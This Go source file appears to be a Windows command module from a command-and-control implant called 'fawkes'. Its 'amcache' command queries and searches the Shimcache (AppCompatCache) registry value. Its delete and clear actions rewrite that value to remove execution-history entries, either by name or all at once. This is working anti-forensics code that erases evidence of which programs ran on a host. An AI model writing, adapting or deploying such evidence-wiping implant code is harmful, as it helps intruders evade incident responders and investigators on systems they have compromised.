//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

// AmcacheCommand implements Shimcache/Amcache forensic artifact management
type AmcacheCommand struct{}

func (c *AmcacheCommand) Name() string {
	return "amcache"
}

func (c *AmcacheCommand) Description() string {
	return "Query and clean Windows Shimcache (AppCompatCache) execution history"
}

type amcacheParams struct {
	Action string `json:"action"`
	Name   string `json:"name"`
	Count  int    `json:"count"`
}

// amcacheOutputEntry is the JSON output format for browser script rendering
type amcacheOutputEntry struct {
	Index        int    `json:"index"`
	LastModified string `json:"last_modified"`
	Path         string `json:"path"`
}

func (c *AmcacheCommand) Execute(task structs.Task) structs.CommandResult {
	var params amcacheParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.Action == "" {
		params.Action = "query"
	}
	if params.Count == 0 {
		params.Count = 50
	}

	switch params.Action {
	case "query":
		return amcacheQuery(params)
	case "search":
		return amcacheSearch(params)
	case "delete":
		return amcacheDelete(params)
	case "clear":
		return amcacheClear()
	default:
		return errorf("Unknown action: %s (use query, search, delete, or clear)", params.Action)
	}
}

// readShimcacheRaw reads the raw AppCompatCache registry value
func readShimcacheRaw() ([]byte, error) {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`,
		registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("open registry key: %v", err)
	}
	defer key.Close()

	val, _, err := key.GetBinaryValue("AppCompatCache")
	if err != nil {
		return nil, fmt.Errorf("read AppCompatCache value: %v", err)
	}
	return val, nil
}

// parseShimcacheWin10, parseShimcacheWin8, parseShimcache moved to forensics_helpers.go

func amcacheQuery(params amcacheParams) structs.CommandResult {
	data, err := readShimcacheRaw()
	if err != nil {
		return errorf("Error reading Shimcache: %v", err)
	}

	entries, _, err := parseShimcache(data)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error parsing Shimcache: %v\nRaw data size: %d bytes, first 4 bytes: 0x%08X",
				err, len(data), binary.LittleEndian.Uint32(data[0:4])),
			Status:    "error",
			Completed: true,
		}
	}

	count := params.Count
	if count > len(entries) {
		count = len(entries)
	}

	output := make([]amcacheOutputEntry, 0, count)
	for i := 0; i < count; i++ {
		e := entries[i]
		ts := ""
		if !e.LastModified.IsZero() {
			ts = e.LastModified.Format("2006-01-02 15:04:05")
		}
		output = append(output, amcacheOutputEntry{
			Index:        i + 1,
			LastModified: ts,
			Path:         e.Path,
		})
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return errorf("Error marshaling output: %v", err)
	}

	return successResult(string(jsonBytes))
}

func amcacheSearch(params amcacheParams) structs.CommandResult {
	if params.Name == "" {
		return errorResult("Error: -name parameter required for search")
	}

	data, err := readShimcacheRaw()
	if err != nil {
		return errorf("Error reading Shimcache: %v", err)
	}

	entries, _, err := parseShimcache(data)
	if err != nil {
		return errorf("Error parsing Shimcache: %v", err)
	}

	searchLower := strings.ToLower(params.Name)
	var output []amcacheOutputEntry

	for i, e := range entries {
		if strings.Contains(strings.ToLower(e.Path), searchLower) {
			ts := ""
			if !e.LastModified.IsZero() {
				ts = e.LastModified.Format("2006-01-02 15:04:05")
			}
			output = append(output, amcacheOutputEntry{
				Index:        i + 1,
				LastModified: ts,
				Path:         e.Path,
			})
		}
	}

	if output == nil {
		output = []amcacheOutputEntry{}
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return errorf("Error marshaling output: %v", err)
	}

	return successResult(string(jsonBytes))
}

// amcacheDelete removes matching entries from the Shimcache by rewriting the registry value
func amcacheDelete(params amcacheParams) structs.CommandResult {
	if params.Name == "" {
		return errorResult("Error: -name parameter required for delete")
	}

	data, err := readShimcacheRaw()
	if err != nil {
		return errorf("Error reading Shimcache: %v", err)
	}

	// Only support Win10/11 format for deletion
	headerSize := binary.LittleEndian.Uint32(data[0:4])
	if headerSize < 48 || headerSize > 128 || int(headerSize)+4 > len(data) {
		return errorf("Delete only supported for Windows 10/11 format (header: 0x%08X)", headerSize)
	}
	entrySig := binary.LittleEndian.Uint32(data[headerSize : headerSize+4])
	if entrySig != shimcacheWin10Sig {
		return errorf("Delete only supported for Windows 10/11 format (entry sig: 0x%08X)", entrySig)
	}

	entries, err := parseShimcacheWin10(data)
	if err != nil {
		return errorf("Error parsing Shimcache: %v", err)
	}

	// Find entries to keep (exclude matching ones)
	searchLower := strings.ToLower(params.Name)
	var keepEntries []shimcacheEntry
	removed := 0

	for _, e := range entries {
		if strings.Contains(strings.ToLower(e.Path), searchLower) {
			removed++
		} else {
			keepEntries = append(keepEntries, e)
		}
	}

	if removed == 0 {
		return successf("No entries matching \"%s\" found in Shimcache", params.Name)
	}

	// Rebuild the Shimcache binary data with matching entries removed
	newData := rebuildShimcacheWin10(data[:headerSize], keepEntries, data)
	if newData == nil {
		return errorResult("Error rebuilding Shimcache data")
	}

	// Write back
	if err := writeShimcache(newData); err != nil {
		return errorf("Error writing Shimcache: %v", err)
	}

	return successf("Removed %d entries matching \"%s\" from Shimcache (%d remaining)", removed, params.Name, len(keepEntries))
}

// amcacheClear removes all Shimcache entries
func amcacheClear() structs.CommandResult {
	data, err := readShimcacheRaw()
	if err != nil {
		return errorf("Error reading Shimcache: %v", err)
	}

	if len(data) < 52 {
		return errorResult("Shimcache data too small")
	}

	entries, _, _ := parseShimcache(data)
	totalEntries := len(entries)

	// Write just the header (no entries) — header size from first 4 bytes
	headerSize := int(binary.LittleEndian.Uint32(data[0:4]))
	if headerSize < 48 || headerSize > 128 || headerSize > len(data) {
		headerSize = 52 // Default Win10/11 header size
	}
	header := make([]byte, headerSize)
	copy(header, data[:headerSize])

	if err := writeShimcache(header); err != nil {
		return errorf("Error clearing Shimcache: %v", err)
	}

	return successf("Cleared Shimcache — removed %d entries", totalEntries)
}

// rebuildShimcacheWin10 moved to forensics_helpers.go

// writeShimcache writes new Shimcache data to the registry
func writeShimcache(data []byte) error {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`,
		registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("open key for write: %v", err)
	}
	defer key.Close()

	if err := key.SetBinaryValue("AppCompatCache", data); err != nil {
		return fmt.Errorf("write value: %v", err)
	}
	return nil
}

// decodeUTF16LEShim moved to command_helpers.go
